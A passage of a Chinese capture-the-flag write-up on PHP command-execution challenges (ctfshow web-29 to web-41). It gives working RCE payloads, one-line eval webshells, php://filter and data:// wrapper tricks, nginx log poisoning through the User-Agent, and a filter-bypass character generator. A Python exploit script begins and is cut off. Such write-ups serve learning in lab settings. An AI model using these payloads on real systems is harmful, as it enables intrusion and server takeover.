id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="web-29"><a href="#web-29" class="headerlink" title="web-29"></a>web-29</h3><p><strong>可以使用php伪协议进行绕过</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line">其中?&gt;代替分号</span><br></pre></td></tr></table></figure><p><strong>也可以使用linux命令直接查看</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">?c=system(&quot;tac%20fla*&quot;); </span><br><span class="line">#这个;千万不要忘记</span><br><span class="line">#如果进行了文件黑名单可以使用*绕过</span><br><span class="line"></span><br><span class="line">cat $(ls | head -n 1)</span><br><span class="line">head -n 1：获取列表中的第一个文件。</span><br><span class="line"></span><br><span class="line">用egrep效果一样egrep=grep  -E</span><br><span class="line">?c=system(&quot;cat fl*g.php | grep  -E &#x27;fl.g&#x27; &quot;);</span><br><span class="line">?c=system(&quot;cat fl*g.php&quot;);</span><br><span class="line"></span><br><span class="line">倒序输出文本</span><br><span class="line">?c=system(&quot;tac fl*g.php&quot;);</span><br><span class="line">复制文本至a.txt</span><br><span class="line">?c=system(&quot;cp fl*g.php a.txt &quot;);</span><br><span class="line">访问/a.txt</span><br><span class="line">直接输出一个php这样就可以直接利用代码了,注意也是右键查看源代码</span><br><span class="line">c=system(&#x27;echo -e &quot; &lt;?php \n error_reporting(0); \n  \$c= \$_GET[\&#x27;c\&#x27;]; \n eval(\$c); &quot; &gt; a.php&#x27;);</span><br><span class="line">/a.php?c=system(&quot;tac flag.php&quot;);</span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;eval函数不支持数组，所以这题不适用数组绕过&#x3D;&#x3D;</p><p><strong>也可以使用一句话木马</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=eval($_POST[&#x27;yyssh&#x27;]);</span><br><span class="line">eval函数里面再包含eval</span><br></pre></td></tr></table></figure><h3 id="web-30"><a href="#web-30" class="headerlink" title="web-30"></a>web-30</h3><p><strong>与上一题类似</strong></p><h4 id="php执行系统命令函数"><a href="#php执行系统命令函数" class="headerlink" title="php执行系统命令函数"></a>php执行系统命令函数</h4><h6 id="system"><a href="#system" class="headerlink" title="system"></a>system</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">说明：执行外部程序并显示输出资料。</span><br><span class="line">语法：string system(string command, int [return_var]);</span><br><span class="line">返回值: 字符串</span><br><span class="line"></span><br><span class="line">详细介绍：</span><br><span class="line">本函数就像是 C 语中的函数 system()，用来执行指令，并输出结果。若是 return_var 参数存在，则执行 command 之后的状态会填入 return_var 中。同样值得注意的是若需要处理用户输入的资料，而又要防止用户耍花招破解系统，则可以使用 EscapeShellCmd()。若 PHP 以模块式的执行，本函数会在每一行输出后自动更新 Web 服务器的输出缓冲暂存区。若需要完整的返回字符串，且不想经过不必要的其它中间的输出界面，可以使用 PassThru()。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$last_line = system(&quot;ls&quot;, $retval);</span><br><span class="line">echo &quot;Last line of the output: &quot; . $last_line;</span><br></pre></td></tr></table></figure><h6 id="exec和shell-exec"><a href="#exec和shell-exec" class="headerlink" title="exec和shell_exec"></a>exec和shell_exec</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">说明：执行外部程序。</span><br><span class="line">语法：string exec(string command, string [array], int [return_var]);</span><br><span class="line">返回值: 字符串</span><br><span class="line"></span><br><span class="line">详细介绍：</span><br><span class="line">本函数执行输入 command 的外部程序或外部指令。它的返回字符串只是外部程序执行后返回的最后一行；若需要完整的返回字符串，可以使用 PassThru() 这个函数。</span><br><span class="line"></span><br><span class="line">要是参数 array 存在，command 会将 array 加到参数中执行，若不欲 array 被处理，可以在执行 exec() 之前呼叫 unset()。若是 return_var 跟 array 二个参数都存在，则执行 command 之后的状态会填入 return_var 中。</span><br><span class="line"></span><br><span class="line">值得注意的是若需要处理使用者输入的资料，而又要防止使用者耍花招破解系统，则可以使用 EscapeShellCmd()。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo exec(&quot;whoami&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h6 id="popen"><a href="#popen" class="headerlink" title="popen"></a>popen</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">popen函数</span><br><span class="line">说明：打开文件。</span><br><span class="line">语法：int popen(string command, string mode);</span><br><span class="line">返回值: 整数</span><br><span class="line"></span><br><span class="line">详细介绍：</span><br><span class="line">本函数执行指令开档，而该文件是用管道方式处理的文件。用本函数打开的文件只能是单向的 (只能读或只能写)，而且一定要用 pclose() 关闭。在文件操作上可使用 fgets()、fgetss() 与 fputs()。若是开档发生错误，返回 false 值。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$fp = popen( &quot;/bin/ls&quot;, &quot;r&quot; );</span><br></pre></td></tr></table></figure><h6 id="passthru"><a href="#passthru" class="headerlink" title="passthru"></a>passthru</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">原型：function passthru(string $command,int[optional] $return_value)</span><br><span class="line"></span><br><span class="line">知识点：passthru与system的区别，passthru直接将结果输出到游览器，不返回任何值，且其可以输出二进制，比如图像数据。</span><br></pre></td></tr></table></figure><h6 id="反撇号-（和-在同一个键）执行系统外部命令"><a href="#反撇号-（和-在同一个键）执行系统外部命令" class="headerlink" title="反撇号&#96;（和~在同一个键）执行系统外部命令"></a>反撇号&#96;（和~在同一个键）执行系统外部命令</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">知识点：在使用这种方法执行系统外部命令时，你要确保shell_exec函数可用，否则是无法使用这种反撇号执行系统外部命令的。</span><br><span class="line"></span><br><span class="line">安全性说明</span><br><span class="line">　　当你使用这些函数执行命令时，如果是根据用户提交数据作为执行命令的话，你需要考虑系统安全性，可以使用escapeshellcmd()和escapeshellarg()函数阻止用户恶意在系统上执行命令，escapeshellcmd()针对的是执行的系统命令，而escapeshellarg()针对的是执行系统命令的参数。这两个参数有点类似addslashes()的功能。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo `dir`;</span><br></pre></td></tr></table></figure><h4 id="开发人员查看文件内容"><a href="#开发人员查看文件内容" class="headerlink" title="开发人员查看文件内容"></a>开发人员查看文件内容</h4><h6 id="show-source-scandir-“-”-0"><a href="#show-source-scandir-“-”-0" class="headerlink" title="show_source(scandir(“.”)[0]);"></a>show_source(scandir(“.”)[0]);</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">在 PHP 中，show_source() 函数用于输出指定文件的源代码。它可以帮助开发人员查看文件的内容，通常用于调试或学习目的。scandir() 函数则用于返回指定目录中的文件和目录列表。</span><br><span class="line"></span><br><span class="line">让我们逐步解析你提供的代码 show_source(scandir(&quot;.&quot;)[0]);：</span><br><span class="line"></span><br><span class="line">scandir()：这个函数用于扫描指定目录并返回该目录中文件和子目录的数组。它的第一个参数是目录路径。</span><br><span class="line">&quot;.&quot;：表示当前工作目录。调用 scandir(&quot;.&quot;) 将返回当前目录中的所有文件和目录。</span><br><span class="line"></span><br><span class="line">scandir(&quot;.&quot;)[0]</span><br><span class="line">[0]：这是数组的索引访问，表示获取 scandir() 返回的数组中索引为 0 的元素。</span><br><span class="line"></span><br><span class="line">show_source()</span><br><span class="line">show_source(filename)：此函数接受一个文件名作为参数，并输出该文件的源代码。它会以 HTML 格式显示源代码，并且可以高亮显示语法。</span><br></pre></td></tr></table></figure><h6 id="highlight-file-next-array-reverse-scandir-“-”"><a href="#highlight-file-next-array-reverse-scandir-“-”" class="headerlink" title="highlight_file(next(array_reverse(scandir(“.”))));"></a>highlight_file(next(array_reverse(scandir(“.”))));</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">array_reverse()：该函数接受一个数组并返回该数组的反转版本。也就是说，数组的最后一个元素将变为第一个，依此类推。</span><br><span class="line"></span><br><span class="line">next()：这个函数用于将数组指针向前移动一个位置，并返回当前指针所指向的元素。它会影响数组的内部指针。</span><br><span class="line">假设我们对反转后的数组使用 next()，如果数组是：</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; &quot;dir1&quot;</span><br><span class="line">    [1] =&gt; &quot;file2.php&quot;</span><br><span class="line">    [2] =&gt; &quot;file1.php&quot;</span><br><span class="line">)</span><br><span class="line">调用 next() 后，当前指针将指向 &quot;file2.php&quot;，并返回这个值。</span><br><span class="line"></span><br><span class="line">highlight_file(filename)：这个函数接受一个文件名作为参数，并输出该文件的源代码，同时以 HTML 高亮显示。这个函数通常用于调试和查看 PHP 文件的内容。</span><br></pre></td></tr></table></figure><h3 id="web-31"><a href="#web-31" class="headerlink" title="web-31"></a>web-31</h3><h6 id="show-source-next-array-reverse-scandir-pos-localeconv"><a href="#show-source-next-array-reverse-scandir-pos-localeconv" class="headerlink" title="show_source(next(array_reverse(scandir(pos(localeconv())))));"></a>show_source(next(array_reverse(scandir(pos(localeconv())))));</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">localeconv()返回一包含本地数字及货币格式信息的数组。而数组第一项就是&quot;.&quot;</span><br><span class="line"></span><br><span class="line">current()返回数组中的单元，默认取第一个值：</span><br><span class="line">pos()：这个函数用于返回数组的第一个值，并将内部指针移到数组的第一个元素。它可以用于获取数组的第一个元素。</span><br><span class="line">pos是current的别名</span><br><span class="line"></span><br><span class="line">如果都被过滤还可以使用reset()，该函数返回数组第一个单元的值，如果数组为空则返回 FALSE</span><br></pre></td></tr></table></figure><h6 id="c-f-glob-“f-”-show-source-f-0"><a href="#c-f-glob-“f-”-show-source-f-0" class="headerlink" title="?c&#x3D;$f&#x3D;glob(“f*”);show_source($f[0]);"></a>?c&#x3D;$f&#x3D;glob(“f*”);show_source($f[0]);</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">glob()：这个函数用于根据给定的模式查找文件路径。它返回一个数组，其中包含与模式匹配的文件名。</span><br><span class="line">&quot;f*&quot;：这是一个通配符模式，表示匹配所有以字母 f 开头的文件名。例如，它可能匹配到 file1.txt、foo.php 等文件。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">假设当前目录包含以下文件：</span><br><span class="line">file1.txt</span><br><span class="line">foo.php</span><br><span class="line">bar.txt</span><br><span class="line"></span><br><span class="line">调用 glob(&quot;f*&quot;) 将返回一个数组：</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; &quot;file1.txt&quot;</span><br><span class="line">    [1] =&gt; &quot;foo.php&quot;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;获取绝对路径可用的有<code>getcwd()</code>和<code>realpath(&#39;.&#39;)</code>所以我们还可以用<code>print_r(scandir(getcwd()));</code>输出当前文件夹所有文件名&#x3D;&#x3D;</p><p>如果要获取的数组是最后一个我们可以用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>())));</span><br></pre></td></tr></table></figure><p>ps：**<code>readgzfile()</code>也可读文件，常用于绕过过滤**</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readgzfile() 可用于读取非 gzip 格式的文件; 在这种情况下，readgzfile() 将直接从文件中读取而不进行解压缩。</span><br></pre></td></tr></table></figure><h3 id="web-32"><a href="#web-32" class="headerlink" title="web-32"></a>web-32</h3><h6 id="php中不需要（）的函数"><a href="#php中不需要（）的函数" class="headerlink" title="php中不需要（）的函数"></a>php中不需要（）的函数</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo 123;</span><br><span class="line">print 123;</span><br><span class="line">die;</span><br><span class="line">include &quot;/etc/passwd&quot;;</span><br><span class="line">require &quot;/etc/passwd&quot;;</span><br><span class="line">include_once &quot;/etc/passwd&quot;;</span><br><span class="line">require_once &quot;etc/passwd&quot;;</span><br></pre></td></tr></table></figure><h6 id="换一种方法的UA注入"><a href="#换一种方法的UA注入" class="headerlink" title="换一种方法的UA注入"></a>换一种方法的UA注入</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url/?c=include$_GET[1]?%3E&amp;1=../../../../var/log/nginx/access.log</span><br><span class="line">/var/log/nginx/access.log是nginx默认的access日志路径，访问该路径时，在User-Agent中写入一句话木马，然后用中国蚁剑连接即可</span><br></pre></td></tr></table></figure><h3 id="web-33"><a href="#web-33" class="headerlink" title="web-33"></a>web-33</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">跟上一道题一样的注入，但是解释一下为什么这后面的.不会被过滤</span><br><span class="line">因为preg_match函数只过滤前面变量c的内容，对变量1的内容不进行过滤</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这个协议也可以换成php://input</span><br><span class="line">改变请求，再加一个请求主体</span><br><span class="line"></span><br><span class="line">data://text/plain,后面接一句话木马或者注入内容</span><br></pre></td></tr></table></figure><h3 id="web-34-35-36"><a href="#web-34-35-36" class="headerlink" title="web-34\35\36"></a>web-34\35\36</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">和上一关一样</span><br></pre></td></tr></table></figure><h3 id="web-37-38"><a href="#web-37-38" class="headerlink" title="web-37\38"></a>web-37\38</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这关其实换汤不换药，把命令执行换成了include，但是依然可以UA一句话木马</span><br><span class="line">或者伪协议data://text/plain,</span><br></pre></td></tr></table></figure><h3 id="web-39"><a href="#web-39" class="headerlink" title="web-39"></a>web-39</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这关因为在get请求数据后面衔接.php所以不能进行编码绕过</span><br><span class="line">#因为是先进行衔接再进行data流解析</span><br><span class="line"></span><br><span class="line">所以直接输入data://text/plain,&lt;?php @eval($_POST[&#x27;yyssh&#x27;])?&gt;</span><br><span class="line">因为include只解析&lt;php包含内容&gt;，当然也可以用//把后面的部分给注释掉</span><br></pre></td></tr></table></figure><h3 id="web-40"><a href="#web-40" class="headerlink" title="web-40"></a>web-40</h3><h5 id="GET和POST请求分离"><a href="#GET和POST请求分离" class="headerlink" title="GET和POST请求分离"></a>GET和POST请求分离</h5><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">这道题过滤的其实是中文括号，所以可以用无参数命令绕过</span><br><span class="line">show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line"></span><br><span class="line">?c=eval(next(reset(get_defined_vars())));&amp;1=system(&quot;tac%20flag.php&quot;);</span><br><span class="line">这里采用自变量偏移，先在前面偏移一个变量，然后再自己设置变量1，将next指针指向了system这段函数</span><br><span class="line"></span><br><span class="line">get_defined_vars()：这个函数返回当前作用域中定义的所有变量的数组。</span><br><span class="line">reset()：重置数组的内部指针，返回数组的第一个元素。</span><br><span class="line">next()：将内部指针向前移动一个位置，并返回当前指针所指向的元素。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;他这道题还隐藏着一个什么都没有过滤的POST(参数都没有，可以直接写入)的请求&#x3D;&#x3D;</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?c=print_r(get_defined_vars());</span><br><span class="line">//打印当前作用域有哪些数组</span><br><span class="line"></span><br><span class="line">发现一个POST请求数组，发现可以随意写入，没有参数</span><br><span class="line">1=phpinfo();</span><br><span class="line"></span><br><span class="line">GET: ?c=eval(array_pop(next(get_defined_vars())));</span><br><span class="line">POST: 1=system(&#x27;tac flag.php&#x27;);</span><br><span class="line">执行任意命令</span><br></pre></td></tr></table></figure><h3 id="web-41"><a href="#web-41" class="headerlink" title="web-41"></a>web-41</h3><h4 id="执行常见系统命令-函数"><a href="#执行常见系统命令-函数" class="headerlink" title="执行常见系统命令&#x2F;函数"></a>执行常见系统命令&#x2F;函数</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">常见的系统命令可以进行命令执行：</span><br><span class="line">awk  格式：awk&#x27;&#123;printf $0;&#125;&#x27;flag.php || 该命令意思是其全局检索flag.php内容并输出</span><br><span class="line">cat/tac  读取，tac是cat的倒向读取</span><br><span class="line">nl  读取文件，并在文件的每一行前面标上行号</span><br><span class="line">vi/vim  编辑器，可以实现查看文件</span><br><span class="line">od  二进制方式读取文件内容</span><br><span class="line">more  类似于cat</span><br><span class="line">mv/cp 复制，但是可以通过复制的文件输出 </span><br><span class="line">file -f 报错出具体内容</span><br><span class="line">uniq 也可以读取文件内容，但是会去重</span><br><span class="line">ls  读目录</span><br></pre></td></tr></table></figure><h4 id="Exp脚本编写"><a href="#Exp脚本编写" class="headerlink" title="Exp脚本编写"></a>Exp脚本编写</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这道题实行了严格的过滤,对所有的数字、字母、以及大部分字符标点符号，但是遗留了||按位或运算符</span><br><span class="line">所以这道题的绕过想法是将没有被过滤的代码进行按位或运算生成一个命令执行字符串</span><br><span class="line">首先第一步筛选出没有被过滤的字符，然后将没有被过滤的字符进行按位或运算，得到新的字符</span><br><span class="line">因为没有被过滤的字符还有很多，生成的新字符也有很多，所以这里我们采用编写脚本</span><br></pre></td></tr></table></figure><p><strong>生成字符</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;rce_or.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);<span class="comment">//将字符写入文本中</span></span><br><span class="line">    <span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">256</span>;<span class="variable">$i</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;<span class="number">256</span>;<span class="variable">$j</span>++)<span class="comment">//将所有的ASCII码值筛选出来</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);<span class="comment">//进行十六进制编码</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$preg</span> = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))</span><br><span class="line">            &#123;<span class="comment">//筛选没有被过滤的字符串</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;<span class="comment">//将这些字符串进行URL编码</span></span><br><span class="line">                <span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">                <span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));<span class="comment">//解码之后进行按位或运算</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) <span class="comment">//如果可以打印出来则记录进文本中</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="comment">//这里为什么不把contents每一次都置0，因为最后只记录一次contens进入文本(所以对contents进行累加)</span></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>拿到我们想要的新字符,可以进行RCE的，这里我们用system来进行举例</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这里有两种办法，一种是去文本文件里面，直接搜索我们要的新字符，然后一个一个写入</span><br><span class="line">还有一种是通过编写脚本，帮助我们查询新字符，并合成字符串，发送至URL</span><br></pre></td></tr></table></figure><p><strong>查询字符</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib<span class="comment">#对POST传入数据进行URL编码</span></span><br><span class="line"><span class="keyword">import</span> requests<span class="comment">#发送POST请求</span></span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *<span class="comment">#读取用户传入参数</span></span><br><span class="line"><span class="keyword">import</span> os<span class="comment">#执行前面的生成字符文件</span></span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&quot;php web22.php&quot;</span>)<span class="comment">#执行前面的生成字符文件</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(argv)!=<span class="number">2</span> :<span class="comment">#判断用户输入是否正确</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">50</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你输入的不正确&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;输入格式为：python 脚本名 url&quot;</span>)</span><br><span 